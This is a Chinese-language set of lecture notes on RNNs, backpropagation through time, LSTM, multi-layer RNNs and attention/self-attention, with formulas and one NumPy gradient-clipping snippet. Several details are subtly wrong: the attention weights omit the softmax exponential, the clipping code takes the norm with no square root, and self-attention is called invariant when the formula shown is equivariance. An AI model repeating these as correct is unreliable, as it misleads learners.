15h11z"/></svg></span> 19 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 7 分钟</p>
</div>
<p>Recurrent Neural Networks (RNNs) 循环神经网络是一种特殊的神经网络，它能够处理序列数据。对于一般的前馈神经网络，输入和输出是one-to-one的关系，而对于RNNs，输入和输出可以是one-to-many, many-to-one, many-to-many的关系。</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec16-1.png" width="70%&quot;" />
</figure>
<h2 id="note-cs-cv-lec16-structure-of-rnns">Structure of RNNs<a class="headerlink" href="#note-cs-cv-lec16-structure-of-rnns" title="Permanent link">&para;</a></h2>
<blockquote>
<p>Key idea: RNNs have an “internal state” that is updated as a sequence is processed</p>
</blockquote>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec16-2.png" width="70%&quot;" />
</figure>
<div class="arithmatex">\[
    h_t=f_W(h_{t-1},x_t)
\]</div>
<p>其中，<span class="arithmatex">\(h_t\)</span> 是RNN的下一时刻的隐藏状态，<span class="arithmatex">\(x_t\)</span> 是输入，<span class="arithmatex">\(f_W\)</span>是激活函数。例如tanh函数。当然一般也会包含偏置项<span class="arithmatex">\(b_h\)</span>。</p>
<p>例如</p>
<div class="arithmatex">\[
  h_t=tanh(W_{hh}h_{t-1}+W_{xh}x_t+b_h)
\]</div>
<h3 id="note-cs-cv-lec16-computation-graph">Computation Graph<a class="headerlink" href="#note-cs-cv-lec16-computation-graph" title="Permanent link">&para;</a></h3>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec16-3.png" width="70%&quot;" />

<figcaption>
    many-to-many
</figcaption>
</figure>
<p>对于多对多的情况，例如语言预测模型，每一个输出都依赖当前的输入和前一个隐藏状态。得到输出之后，再计算损失，最后每个输出的损失结合在一起，得到总的损失。</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec16-4.png" width="70%&quot;" />

<figcaption>
    many-to-one
</figcaption>
</figure>
<p>对于多对一的情况(例如情感分析，输入一个句子，输出一个情感标签。)输出只在最后一个阶段产生。</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec16-5.png" width="70%&quot;" />

<figcaption>
    one-to-many
</figcaption>
</figure>
<p>对于一对多的情况(例如图像描述，输入是一张图片，输出是描述这个图片的句子。)输入只在第一个阶段，每一个输出依赖于前一个隐藏状态。</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec16-6.png" width="70%&quot;" />

<figcaption>
    sequence-to-sequence
</figcaption>
</figure>
<p>对于序列到序列的情况(例如机器翻译，输入是一个句子，输出是另一个句子。)会分为两个部分，一个编码器，一个解码器。</p>
<p>编码器是一个many-to-one的RNN，解码器是一个one-to-many的RNN。</p>
<p>编码器的输出作为解码器的隐藏状态的初始值。</p>
<div class="admonition warning">
<p class="admonition-title">Warning</p>
<p>每一个RNN内部的<span class="arithmatex">\(W_{hh}\)</span>和<span class="arithmatex">\(W_{xh}\)</span>是共享的。</p>
</div>
<div class="admonition example">
<p class="admonition-title">Language Modeling</p>
<p>Given characters 1, 2, …, t-1, model predicts character t;
例如现在字典有[h,e,l,o],使用字符串"Hello"训练一个语言模型来预测下一个字符；
<figure markdown="span">
<img alt="" src="../NOTE/CS/CV/img/lec16-7.png" width="70%&quot;" />
<figcaption>
train-time
</figcaption>
</figure></p>
<ul>
<li>给输入'h',将输出与'e'比较，计算损失，然后更新参数。</li>
<li>给输入'he',将输出与'l'比较，计算损失，然后更新参数。</li>
<li>给输入'hel',将输出与'l'比较，计算损失，然后更新参数。</li>
<li>给输入'hell',将输出与'o'比较，计算损失，然后更新参数。</li>
<li>给输入'hello',将输出与'e'比较，计算损失，然后更新参数。</li>
</ul>
<p><figure markdown="span">
 <img alt="" src="../NOTE/CS/CV/img/lec16-8.png" width="70%&quot;" />
<figcaption>
test-time
</figcaption>
</figure>
在使用的时候只给定第一个字符，将其输出作为第二个输入，以此类推。</p>
<p>每个输入都可以用one-hot编码来表示。</p>
<p>所以其与矩阵相乘实际上选中的是矩阵的对应的那一列。
<figure markdown="span">
<img alt="" src="../NOTE/CS/CV/img/lec16-9.png" width="70%&quot;" />
</figure></p>
<p>当一个独热向量与权重矩阵相乘时，它实际上是从矩阵中提取一列。 当字典很大时，one-hot编码的维度会很高，所以需要使用嵌入层（Embedding Layer）来将类别数据（如单词或标记）转换为密集的向量表示。</p>
<p>嵌入层（Embedding Layer）是一种神经网络层，用于将类别数据（如单词或标记）转换为密集的向量表示。这在自然语言处理（NLP）任务中尤为重要，因为需要以一种能够捕捉语义意义的方式来表示单词。通过直接将索引映射到向量来优化这一过程，从而提高计算效率。</p>
<p><figure markdown="span">
<img alt="" src="../NOTE/CS/CV/img/lec16-10.png" width="70%&quot;" />
<figcaption>
Embedding Layer
</figcaption>
</figure></p>
</div>
<h3 id="note-cs-cv-lec16-backpropagation-through-time">Backpropagation through time<a class="headerlink" href="#note-cs-cv-lec16-backpropagation-through-time" title="Permanent link">&para;</a></h3>
<p>在标准的反向传播中，梯度是通过网络的每一层从输出层向输入层传播的。然而，在RNN中，隐藏层的状态不仅依赖于当前的输入，还依赖于前一个时间步的隐藏状态。因此，BPTT需要在时间维度上展开RNN，并计算每个时间步的梯度。</p>
<p>具体来说，BPTT的步骤如下：</p>
<ol>
<li><strong>展开RNN</strong>：将RNN在时间维度上展开，形成一个包含多个时间步的前馈神经网络。</li>
<li><strong>前向传播</strong>：通过展开的网络进行前向传播，计算每个时间步的输出和隐藏状态。</li>
<li><strong>计算损失</strong>：根据实际输出和预测输出计算损失。</li>
<li><strong>反向传播</strong>：从最后一个时间步开始，逐步向前计算每个时间步的梯度。梯度不仅在时间步之间传播，还在网络层之间传播。</li>
<li><strong>更新参数</strong>：使用计算得到的梯度更新网络的参数。</li>
</ol>
<p>需要注意的是，由于RNN的展开长度可能非常长，BPTT的计算开销较大。此外，长时间步的反向传播可能导致梯度消失或梯度爆炸问题。为了解决这些问题，可以使用截断的BPTT（Truncated BPTT），即只在固定的时间步数内进行反向传播。</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec16-11.png" width="70%&quot;" />

<figcaption>
Backpropagation through time
</figcaption>
</figure>
<blockquote>
<p>Takes a lot of memory for long sequences</p>
</blockquote>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec16-12.png" width="70%&quot;" />

<figcaption>
Truncated BPTT
</figcaption>
</figure>
<blockquote>
<p>Carry hidden states forward in time forever, but only backpropagate for some smaller number of steps</p>
</blockquote>
<p>在语言预测模型中，对于RNN中隐藏单元的解释是，它表示了在当前时间步的上下文，以及其主要关注的单词，换句话说，它正在对当前文本进行着色，并指出它正在关注哪些单词。</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec16-13.png" width="70%&quot;" />

<figcaption>
Interpretable Hidden Units
</figcaption>
</figure>
<div class="admonition example">
<p class="admonition-title">image captioning</p>
<p><figure markdown="span">
<img alt="" src="../NOTE/CS/CV/img/lec16-14.png" width="100%&quot;" />
<figcaption>
Image Captioning
</figcaption>
</figure></p>
<p>首先使用已经训练好的image net模型提取图片特征，然后使用RNN生成描述图片的句子。</p>
<p>在这个过程中</p>
<div class="arithmatex">\[
    tanh(W_{hh}h_{t-1}+W_{xh}x_t+W_{ih}v+b_h)
\]</div>
<ul>
<li>
<p>向量 <span class="arithmatex">\( v \)</span> 代表从图像中提取的特征向量。这个特征向量通过卷积神经网络（CNN）从输入图像中提取，并用于初始化或影响循环神经网络（RNN）的隐藏状态，以帮助生成与图像相关的文本描述。</p>
</li>
<li>
<p>向量 <span class="arithmatex">\( h_{t-1} \)</span> 代表前一个时间步的隐藏状态。</p>
</li>
<li>
<p>向量 <span class="arithmatex">\( x_t \)</span> 代表当前时间步的输入。</p>
</li>
<li>
<p>向量 <span class="arithmatex">\( b_h \)</span> 代表偏置项。</p>
</li>
</ul>
</div>
<h2 id="note-cs-cv-lec16-long-short-term-memory-lstm">long short term memory (LSTM)<a class="headerlink" href="#note-cs-cv-lec16-long-short-term-memory-lstm" title="Permanent link">&para;</a></h2>
<h3 id="note-cs-cv-lec16-vanilla-rnn-gradient">Vanilla RNN Gradient<a class="headerlink" href="#note-cs-cv-lec16-vanilla-rnn-gradient" title="Permanent link">&para;</a></h3>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec16-15.png" width="90%&quot;" />

<figcaption>
Vanilla RNN Gradient
</figcaption>
</figure>
<div class="arithmatex">\[
h_t = \tanh(W_{hh}h_{t-1} + W_{xh}x_t + b_h) \\
= \tanh\left(\begin{bmatrix} W_{hh} &amp; W_{xh} \end{bmatrix} \begin{bmatrix} h_{t-1} \\ x_t \end{bmatrix} + b_h\right) \\
= \tanh\left(W \begin{bmatrix} h_{t-1} \\ x_t \end{bmatrix} + b_h\right)
\]</div>
<p>在对<span class="arithmatex">\(h_t\)</span>进行反向传播时，每一次都会乘以一个<span class="arithmatex">\(W_{hh}\)</span></p>
<ul>
<li>如果<span class="arithmatex">\(W_{hh}\)</span>的值小于1，那么随着反向传播的进行，<span class="arithmatex">\(h_t\)</span>的值会趋近于0，会发生Vanishing gradients</li>
<li>如果<span class="arithmatex">\(W_{hh}\)</span>的值大于1，那么随着反向传播的进行，<span class="arithmatex">\(h_t\)</span>的值会趋近于无穷大，会发生Exploding gradients</li>
</ul>
<p>对于梯度爆炸，可以采取截断梯度（Gradient Clipping）的方法来解决。
<div class="language-python highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-cs-cv-lec16-__codelineno-0-1"></a><span class="n">grad_norm</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">sum</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">square</span><span class="p">(</span><span class="n">grad</span><span class="p">))</span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#note-cs-cv-lec16-__codelineno-0-2"></a><span class="k">if</span> <span class="n">grad_norm</span> <span class="o">&gt;</span> <span class="n">threshold</span><span class="p">:</span>
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#note-cs-cv-lec16-__codelineno-0-3"></a>    <span class="n">grad</span> <span class="o">=</span> <span class="n">grad</span> <span class="o">*</span> <span class="n">threshold</span> <span class="o">/</span> <span class="n">grad_norm</span>
</span></code></pre></div></p>
<p>对于梯度消失，就需要使用LSTM来解决。</p>
<h3 id="note-cs-cv-lec16-lstm">LSTM<a class="headerlink" href="#note-cs-cv-lec16-lstm" title="Permanent link">&para;</a></h3>
<p>LSTM是一种特殊的RNN，它能够更好地处理长期依赖关系。LSTM通过引入一个记忆单元来解决RNN的梯度消失问题。</p>
<div class="arithmatex">\[
\begin{pmatrix}
i_t \\
f_t \\
o_t \\
g_t
\end{pmatrix}
=
\begin{pmatrix}
\sigma \\
\sigma \\
\sigma \\
\tanh
\end{pmatrix}
\left(W
\begin{pmatrix}
h_{t-1} \\
x_t
\end{pmatrix}
+ b_h\right)
\]</div>
<div class="arithmatex">\[
c_t = f_t \odot c_{t-1} + i_t \odot g_t
\]</div>
<div class="arithmatex">\[
h_t = o_t \odot \tanh(c_t)
\]</div>
<div class="admonition definition">
<p class="admonition-title">Definition</p>
<ul>
<li><span class="arithmatex">\(i_t\)</span> is the input gate:  whether to write to cell</li>
<li><span class="arithmatex">\(f_t\)</span> is the forget gate:  whether to keep the cell content</li>
<li><span class="arithmatex">\(o_t\)</span> is the output gate:  how much to reveal cell</li>
<li><span class="arithmatex">\(g_t\)</span> is the candidate cell content,or the Gate gate: how much to write to cell</li>
</ul>
</div>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec16-16.png" width="90%&quot;" />

<figcaption>
LSTM
</figcaption>
</figure>
<blockquote>
<p>首先执行<span class="arithmatex">\((4h \times 2h)\times (2h \times 1)\)</span>的映射，然后对应应用sigmoid或者tanh函数，得到四个门，再与<span class="arithmatex">\(c_{t-1}\)</span>和<span class="arithmatex">\(g_t\)</span>相乘加上<span class="arithmatex">\(i_t\)</span>乘<span class="arithmatex">\(g_t\)</span>，得到<span class="arithmatex">\(c_t\)</span>，最后通过<span class="arithmatex">\(o_t\)</span>和<span class="arithmatex">\(\tanh(c_t)\)</span>得到<span class="arithmatex">\(h_t\)</span>。</p>
</blockquote>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec16-17.png" width="90%&quot;" />

<figcaption>
Computation Graph of LSTM
</figcaption>
</figure>
<p>有了cell state，在反向传播的过程中由于只有加法，就不会出现信息的流失。可以解决梯度消失的问题。</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec16-18.png" width="90%&quot;" />

<figcaption>
Backpropagation through time of LSTM
</figcaption>
</figure>
<p>这与ResNet的残差连接类似，可以解决梯度消失的问题。</p>
<h2 id="note-cs-cv-lec16-motilayer-rnn">Motilayer RNN<a class="headerlink" href="#note-cs-cv-lec16-motilayer-rnn" title="Permanent link">&para;</a></h2>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec16-19.png" width="90%&quot;" />

<figcaption>
Multi-layer RNN
</figcaption>
</figure>
<p>在多层RNN中，每一层的输入是前一层的输出，每一层的输出是下一层的输入。</p>
<p>即</p>
<div class="arithmatex">\[
h_t^\ell = \tanh \left( W \begin{pmatrix} h_{t-1}^\ell \\ h_t^{\ell-1} \end{pmatrix} + b_h^\ell \right)
\]</div>
<p>对于LSTM，</p>
<div class="arithmatex">\[
\begin{pmatrix}
i_t^\ell \\
f_t^\ell \\
o_t^\ell \\
g_t^\ell
\end{pmatrix}
=
\begin{pmatrix}
\sigma \\
\sigma \\
\sigma \\
\tanh
\end{pmatrix}
\left(W
\begin{pmatrix}
h_{t-1}^\ell \\
h_{t}^{\ell-1}
\end{pmatrix}
+ b_h^\ell\right)
\]</div>
<div class="arithmatex">\[
c_t^\ell = f_t^\ell \odot c_{t-1}^\ell + i_t^\ell \odot g_t^\ell
\]</div>
<div class="arithmatex">\[
h_t^\ell = o_t^\ell \odot \tanh(c_t^\ell)
\]</div></section><section class="print-page" id="note-cs-cv-lec17" heading-number="2.4.5.13"><h1 id="note-cs-cv-lec17-attention">Attention<a class="headerlink" href="#note-cs-cv-lec17-attention" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 2291 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 15 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 8 分钟</p>
</div>
<blockquote>
<p>Attention is all you need!</p>
</blockquote>
<h2 id="note-cs-cv-lec17-introduction">Introduction<a class="headerlink" href="#note-cs-cv-lec17-introduction" title="Permanent link">&para;</a></h2>
<p>在Seq2Seq模型中，编码器将输入序列编码为固定长度的上下文向量，然后解码器使用该上下文向量生成输出序列。然而，这种方法在处理长序列时存在问题，因为编码器需要将整个序列编码为单个向量，这会导致信息丢失。</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec17-1.png" width="90%&quot;" />

<figcaption>
Seq2Seq模型
</figcaption>
</figure>
<p>如果说输入序列很长，那么将其编码为单个向量会不可避免地丢失信息。所以需要引入一种注意力机制，使得解码器在生成每个输出时，能够关注输入序列的不同部分。</p>
<div class="admonition info">
<p class="admonition-title">人眼的注意力机制</p>
<p>人眼在看一个物体时，会有一个focus，对于某个部分会看得更清楚，而其他部分则看得比较模糊。</p>
</div>
<h2 id="note-cs-cv-lec17-attention_1">Attention<a class="headerlink" href="#note-cs-cv-lec17-attention_1" title="Permanent link">&para;</a></h2>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec17-2.png" width="90%&quot;" />

<figcaption>
Attention
</figcaption>
</figure>
<p>例如，一开始，将<span class="arithmatex">\(s_0\)</span>和每个<span class="arithmatex">\(h_i\)</span>进行运算，得到<span class="arithmatex">\(e_{1i}\)</span>，然后进行softmax运算，得到<span class="arithmatex">\(\alpha_{1i}\)</span>，然后根据<span class="arithmatex">\(\alpha_{1i}\)</span>和对应的<span class="arithmatex">\(h_i\)</span>求数学期望，得到最后的<span class="arithmatex">\(c_1\)</span>。</p>
<p>即</p>
<div class="arithmatex">\[
    e_{t+1,i} = f_{att}(s_t, h_i)
\]</div>
<div class="arithmatex">\[
    \alpha_{t+1,i} = \frac{e_{t+1,i}}{\sum_{j=1}^T e_{t+1,j}}
\]</div>
<div class="arithmatex">\[  
    c_{t+1} = \sum_{i=1}^T \alpha_{t+1,i} h_i
\]</div>
<p>得到<span class="arithmatex">\(c_t\)</span>后，再和<span class="arithmatex">\(y_t\)</span>进行运算，得到下一阶段的<span class="arithmatex">\(s_{t+1}\)</span>。然后再重复上述过程，直到生成结束符。</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec17-3.png" width="90%&quot;" />

<figcaption>
Attention
</figcaption>
</figure>
<div class="admonition example">
<p class="admonition-title">Attention</p>
<p><figure markdown="span">
<img alt="" src="../NOTE/CS/CV/img/lec17-4.png" width="90%&quot;" />
<figcaption>
Attention
</figcaption>
</figure></p>
<p>例如将英语翻译成法语的过程，每一个法语单词对英语的每个单词的注意力都不一样(在这里越亮代表注意力越大)</p>
<p><figure markdown="span">
<img alt="" src="../NOTE/CS/CV/img/lec17-5.png" width="90%&quot;" />
<figcaption>
Attention
</figcaption>
</figure></p>
<p>生成图像字幕时，每一个单词对图像的每个区域的关注度也不一样(在这里越亮代表注意力越大)</p>
</div>
<h3 id="note-cs-cv-lec17-image-captioning-with-rnn-and-attention">image Captioning with RNN and attention<a class="headerlink" href="#note-cs-cv-lec17-image-captioning-with-rnn-and-attention" title="Permanent link">&para;</a></h3>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec17-6.png" width="90%&quot;" />

<figcaption>
image Captioning with RNN and attention
</figcaption>
</figure>
<p>图像首先通过CNN处理，生成特征网格（如图中蓝色矩阵所示）。每个特征向量 <span class="arithmatex">\( h_{i,j} \)</span> 代表图像不同区域的信息。</p>
<p>使用注意力函数 <span class="arithmatex">\( f_{att}(s_{t-1}, h_{i,j}) \)</span> 计算对齐分数 <span class="arithmatex">\( e_{t,i,j} \)</span>，表示解码器在时间步 <span class="arithmatex">\( t \)</span> 时对图像特征 <span class="arithmatex">\( h_{i,j} \)</span> 的关注程度。</p>
<p>对对齐分数进行 softmax 运算，得到注意力权重 <span class="arithmatex">\( \alpha_{t,i,j} \)</span>，用于衡量每个特征在生成当前输出时的重要性。</p>
<p>通过加权求和计算上下文向量 <span class="arithmatex">\( c_t = \sum_{i,j} \alpha_{t,i,j} h_{i,j} \)</span>，整合了图像中不同区域的信息。</p>
<p>解码器从起始状态 <span class="arithmatex">\( s_0 \)</span> 开始，结合上下文向量 <span class="arithmatex">\( c_t \)</span> 和前一个输出 <span class="arithmatex">\( y_{t-1} \)</span> 生成下一个状态 <span class="arithmatex">\( s_t \)</span> 和输出 <span class="arithmatex">\( y_t \)</span>。</p>
<p>这个过程持续进行，直到生成结束符。</p>
<h2 id="note-cs-cv-lec17-attention-layer">Attention layer<a class="headerlink" href="#note-cs-cv-lec17-attention-layer" title="Permanent link">&para;</a></h2>
<h3 id="note-cs-cv-lec17-single-query-vector">single Query Vector<a class="headerlink" href="#note-cs-cv-lec17-single-query-vector" title="Permanent link">&para;</a></h3>
<p>输入：</p>
<ul>
<li>Query Vector: <span class="arithmatex">\(q\)</span> shape: <span class="arithmatex">\(D_q\)</span>,例如<span class="arithmatex">\(s_t\)</span></li>
<li>Input Vector: <span class="arithmatex">\(X\)</span> shape: <span class="arithmatex">\(N_X \times D_q\)</span>，例如<span class="arithmatex">\(h\)</span></li>
<li>similarity function: scaled dot-product</li>
</ul>
<p>计算</p>
<p>Computation:</p>
<ul>
<li>Similarities: <span class="arithmatex">\( e \)</span> (Shape: <span class="arithmatex">\( N_X \)</span>) where <span class="arithmatex">\( e_i = q \cdot x_i / \sqrt{D_Q} \)</span></li>
<li>Attention weights: <span class="arithmatex">\( a = \text{softmax}(e) \)</span> (Shape: <span class="arithmatex">\( N_X \)</span>)</li>
<li>Output vector: <span class="arithmatex">\( y = \sum_i a_i x_i \)</span> (Shape: <span class="arithmatex">\( D_q \)</span>)</li>
</ul>
<div class="admonition info">
<p class="admonition-title">Info</p>
<p>在注意力机制中，使用点积来计算相似度。如果向量的维度 <span class="arithmatex">\( D \)</span> 很大，点积的值也会很大。这会导致 softmax 的输出趋于极端值，从而影响梯度的有效传播。
解决方法：为了缓解这个问题，通常会对点积进行缩放（例如，除以 <span class="arithmatex">\( D \)</span> ），以防止相似度值过大。这就是“缩放点积注意力”的由来。</p>
</div>
<h3 id="note-cs-cv-lec17-multi-query-vector">Multi Query Vector<a class="headerlink" href="#note-cs-cv-lec17-multi-query-vector" title="Permanent link">&para;</a></h3>
<p>输入：</p>
<ul>
<li>Query Vectors: <span class="arithmatex">\(Q\)</span> shape: <span class="arithmatex">\(N_q \times D_q\)</span></li>
<li>Input Vectors: <span class="arithmatex">\(X\)</span> shape: <span class="arithmatex">\(N_X \times D_q\)</span></li>
<li>similarity function: scaled dot-product</li>
</ul>
<p>输出</p>
<ul>
<li>
<p>Similarities: <span class="arithmatex">\( E \)</span> (Shape: <span class="arithmatex">\( N_q \times N_X \)</span>) where <span class="arithmatex">\( e_{i,j} = q_i \cdot x_j / \sqrt{D_Q} \)</span>，即<span class="arithmatex">\(E=QX^T/\sqrt{D_Q}\)</span></p>
</li>
<li>
<p>Attention weights: <span class="arithmatex">\( A \)</span> (Shape: <span class="arithmatex">\( N_q \times N_X \)</span>) where <span class="arithmatex">\( a_{i,j} = \text{softmax}(e_{i,j}，dim=1) \)</span></p>
</li>
<li>
<p>Output vectors: <span class="arithmatex">\( Y \)</span> (Shape: <span class="arithmatex">\( N_q \times D_q \)</span>) where <span class="arithmatex">\( y_i = \sum_j a_{i,j} x_j \)</span>，即<span class="arithmatex">\(Y=AX\)</span></p>
</li>
</ul>
<h3 id="note-cs-cv-lec17-key-value-matrix">Key &amp; Value matrix<a class="headerlink" href="#note-cs-cv-lec17-key-value-matrix" title="Permanent link">&para;</a></h3>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec17-7.png" width="90%&quot;" />

<figcaption>
Key &amp; Value matrix
</figcaption>
</figure>
<p>Inputs:</p>
<ul>
<li>Query vectors: <span class="arithmatex">\( \mathbf{Q} \)</span> (Shape: <span class="arithmatex">\( N_q \times D_q \)</span>)</li>
<li>Input vectors: <span class="arithmatex">\( \mathbf{X} \)</span> (Shape: <span class="arithmatex">\( N_x \times D_x \)</span>)</li>
<li>Key matrix: <span class="arithmatex">\( \mathbf{W}_K \)</span> (Shape: <span class="arithmatex">\( D_x \times D_q \)</span>)</li>
<li>Value matrix: <span class="arithmatex">\( \mathbf{W}_V \)</span> (Shape: <span class="arithmatex">\( D_x \times D_v \)</span>)</li>
</ul>
<p>Computation:</p>
<ul>
<li>Key vectors: <span class="arithmatex">\( \mathbf{K} = \mathbf{X} \mathbf{W}_K \)</span> (Shape: <span class="arithmatex">\( N_x \times D_q \)</span>)</li>
<li>Value Vectors: <span class="arithmatex">\( \mathbf{V} = \mathbf{X} \mathbf{W}_V \)</span> (Shape: <span class="arithmatex">\( N_x \times D_v \)</span>)</li>
<li>Similarities: <span class="arithmatex">\( \mathbf{E} = \mathbf{Q} \mathbf{K}^T / \sqrt{D_q} \)</span> (Shape: <span class="arithmatex">\( N_q \times N_x \)</span>), <span class="arithmatex">\( E_{i,j} = (\mathbf{Q}_i \cdot \mathbf{K}_j) / \sqrt{D_q} \)</span></li>
<li>Attention weights: <span class="arithmatex">\( \mathbf{A} = \text{softmax}(\mathbf{E}, \text{dim}=1) \)</span> (Shape: <span class="arithmatex">\( N_q \times N_x \)</span>)</li>
<li>Output vectors: <span class="arithmatex">\( \mathbf{Y} = \mathbf{A} \mathbf{V} \)</span> (Shape: <span class="arithmatex">\( N_q \times D_v \)</span>), <span class="arithmatex">\( Y_i = \sum_j A_{i,j} \mathbf{V}_j \)</span></li>
</ul>
<p>将值向量和键向量分开来，分别通过不同的矩阵进行变换，可以得到更好的效果。</p>
<p>得到对应的E矩阵后，按列进行softmax归一化，得到A矩阵。</p>
<p>最后将A矩阵的列和对应的V矩阵点积运算，得到Y矩阵。</p>
<h3 id="note-cs-cv-lec17-self-attention">Self-attention<a class="headerlink" href="#note-cs-cv-lec17-self-attention" title="Permanent link">&para;</a></h3>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec17-8.png" width="90%&quot;" />

<figcaption>
Self-attention
</figcaption>
</figure>
<p>Inputs:</p>
<ul>
<li>Input vectors: <span class="arithmatex">\( \mathbf{X} \)</span> (Shape: <span class="arithmatex">\( N_x \times D_x \)</span>)</li>
<li>Key matrix: <span class="arithmatex">\( \mathbf{W}_K \)</span> (Shape: <span class="arithmatex">\( D_x \times D_q \)</span>)</li>
<li>Value matrix: <span class="arithmatex">\( \mathbf{W}_V \)</span> (Shape: <span class="arithmatex">\( D_x \times D_v \)</span>)</li>
<li>Query matrix: <span class="arithmatex">\( \mathbf{W}_Q \)</span> (Shape: <span class="arithmatex">\( D_x \times D_q \)</span>)</li>
</ul>
<p>Computation:</p>
<ul>
<li>Query vectors: <span class="arithmatex">\( \mathbf{Q} = \mathbf{X} \mathbf{W}_Q \)</span> (Shape: <span class="arithmatex">\( N_x \times D_q \)</span>)</li>
<li>Key vectors: <span class="arithmatex">\( \mathbf{K} = \mathbf{X} \mathbf{W}_K \)</span> (Shape: <span class="arithmatex">\( N_x \times D_q \)</span>)</li>
<li>Value Vectors: <span class="arithmatex">\( \mathbf{V} = \mathbf{X} \mathbf{W}_V \)</span> (Shape: <span class="arithmatex">\( N_x \times D_v \)</span>)</li>
<li>Similarities: <span class="arithmatex">\( \mathbf{E} = \mathbf{Q} \mathbf{K}^T / \sqrt{D_q} \)</span> (Shape: <span class="arithmatex">\( N_x \times N_x \)</span>), <span class="arithmatex">\( E_{i,j} = (\mathbf{Q}_i \cdot \mathbf{K}_j) / \sqrt{D_q} \)</span></li>
<li>Attention weights: <span class="arithmatex">\( \mathbf{A} = \text{softmax}(\mathbf{E}, \text{dim}=1) \)</span> (Shape: <span class="arithmatex">\( N_x \times N_x \)</span>)</li>
<li>Output vectors: <span class="arithmatex">\( \mathbf{Y} = \mathbf{A} \mathbf{V} \)</span> (Shape: <span class="arithmatex">\( N_x \times D_v \)</span>), <span class="arithmatex">\( Y_i = \sum_j A_{i,j} \mathbf{V}_j \)</span></li>
</ul>
<p>查询向量，键向量，值向量都是由输入向量通过不同的矩阵变换得到的。</p>
<div class="admonition key-point">
<p class="admonition-title">permutation invariant</p>
<p>自注意力机制是排列不变的，即输入序列的顺序不会影响输出结果。只会影响计算的顺序。</p>
<p><figure markdown="span">
<img alt="" src="../NOTE/CS/CV/img/lec17-9.png" width="90%&quot;" />
<figcaption>
permutation invariant
</figcaption>
</figure></p>
<p>即</p>
<div class="arithmatex">\[
    f(s(x))=s(f(x))
\]</div>
</div>
<ul>
<li>
<p>自注意力机制本身不“知道”它处理的向量的顺序。这意味着它对输入序列的排列不敏感。</p>
</li>
<li>
<p>为了使模型能够感知输入序列中元素的顺序，可以将位置编码与输入向量连接或相加。位置编码为每个输入位置提供唯一的表示，使模型能够区分不同位置的元素。</p>
</li>
</ul>
<p>通过添加位置编码，模型可以在处理输入时考虑元素的顺序。这对于自然语言处理等任务非常重要，因为词语的顺序会影响句子的意义。</p>
<h4 id="note-cs-cv-lec17-masked-self-attention">Masked Self-attention<a class="headerlink" href="#note-cs-cv-lec17-masked-self-attention" title="Permanent link">&para;</a></h4>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec17-10.png" width="90%&quot;" />

<figcaption>
Masked Self-attention
</figcaption>
</figure>
<p>在自注意力机制中，<strong>Masked Self-Attention Layer</strong> 是一种特殊的自注意力层</p>
<p>在生成任务中，模型在预测下一个词时不应该看到未来的词。Masked Self-Attention 通过遮掩（masking）未来的词来实现这一点。</p>
<p>在计算注意力权重时，使用遮掩矩阵将未来的词的相似度设置为负无穷大。这确保了 softmax 输出的注意力权重为零，从而忽略未来的信息。</p>
<p>通过这种方式，Masked Self-Attention Layer 能够在不泄露未来信息的情况下进行序列生成。</p>
